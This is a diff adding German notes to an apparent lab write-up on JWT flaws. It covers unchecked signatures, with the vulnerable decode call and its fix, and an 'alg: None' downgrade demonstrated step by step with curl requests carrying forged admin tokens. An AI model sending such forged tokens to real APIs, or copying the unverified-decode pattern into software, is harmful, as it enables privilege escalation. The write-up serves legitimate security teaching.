@@ -138,3 +138,57 @@ curl -H 'Authorization: Bearer ["eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2Vybm
 ```
 
 Und schon erkennt uns die API als Admin an.
+
+### Der Fehler von Developer Seite
+
+Im Beispiel wird die Signatur nicht überprüft, wie unten gezeigt:
+```
+payload = jwt.decode(token, options={'verify_signature': False})
+```
+
+Während dies bei normalen APIs selten vorkommt, ist es bei Server-zu-Server-APIs häufig der Fall. In Fällen, in denen ein Angreifer direkten Zugriff auf den Backend-Server hat, können JWTs gefälscht werden.
+
+### Wie Das Problem gefixed wird
+
+Der JWT sollte immer überprüft werden, oder es sollten zusätzliche Authentifizierungsfaktoren wie Zertifikate für die Server-zu-Server-Kommunikation verwendet werden. Der JWT kann durch Angabe des Geheimnisses (oder öffentlichen Schlüssels) überprüft werden, wie im folgenden Beispiel gezeigt:
+
+```
+payload = jwt.decode(token, self.secret, algorithms="HS256")
+```
+
+## Downgrading to None
+
+Ein weiteres häufiges Problem ist die Herabstufung des Signaturalgorithmus. JWTs unterstützen den Signaturalgorithmus „None“, was effektiv bedeutet, dass keine Signatur mit dem JWT verwendet wird. Das mag zwar albern klingen, aber die Idee dahinter war im Standard für die Server-zu-Server-Kommunikation, bei der die Signatur des JWT in einem vorgelagerten Prozess überprüft wurde. Daher müsste der zweite Server die Signatur nicht überprüfen. Angenommen jedoch, die Entwickler legen den Signaturalgorithmus nicht fest oder lehnen zumindest den Algorithmus „None“ ab. In diesem Fall kann der JWT als „None“ angegebene Algorithmus einfach geändert werden, wodurch die für die Signaturüberprüfung verwendete Bibliothek immer „true“ zurückgibt und man somit wieder beliebige Ansprüche innerhalb Ihres Tokens fälschen können.
+
+### Praktisches Beispiel: 
+Gegebenheit API via http://10.10.187.114/api/v1.0/example3
+
+Zuerst Authentifizieren wir uns einmal als Normaler user via:
+
+```
+curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password3" }' http://10.10.49.39/api/v1.0/example3
+```
+
+und holen uns unseren Token ab: 
+
+`"token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0._yybkWiZVAe1djUIE9CRa0wQslkRmLODBPNsjsY8FO8"`
+
+Jetzt gehen wir her und wandeln die Ersten beiden Segmente des JWTs zu Text um via Cyberchef und dem "From Base64" rezept. Nur die Ersten beiden  da die die Relevanten Claims haben. Claim nummer 3 ist für die Signatur die wir hier nicht benötigen
+
+Daraus ergibt sich 
+- Claim 1 
+	- 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9'
+	- {"typ":"JWT","alg":"HS256"}
+- Claim 2
+	- eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0
+	- {"username":"user","admin":0}
+
+Da wir bei dem Beispiel dafür sorgen wollen das der Signatur algorythmus auf 'None' Gesetzt wird müssen wir erstmal einen JWT mit der Passenden Information senden. Hierfür Modifizieren wir Claim 1 und zwar den wert `"alg":"HS256"` zu `"alg":"None"` und wandeln dass dann wieder in Base64 um das ergibt dann 'eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0'.  
+
+Zudem müssen wir hier noch anpassen das wir Admin Rechte erhalten in Claim2 indem wir den Wert `"admin":0` zu `"admin":1` setzen. Das dann in Base 64 umgewandelt ist dann: `eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0`
+
+Jetzt können wir die Erste Anfrage wieder zusammensetzen.
+
+```
+curl -H 'Authorization: Bearer ["eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0._yybkWiZVAe1djUIE9CRa0wQslkRmLODBPNsjsY8FO8"]' http://10.10.49.39/api/v1.0/example3?username=admin
+```
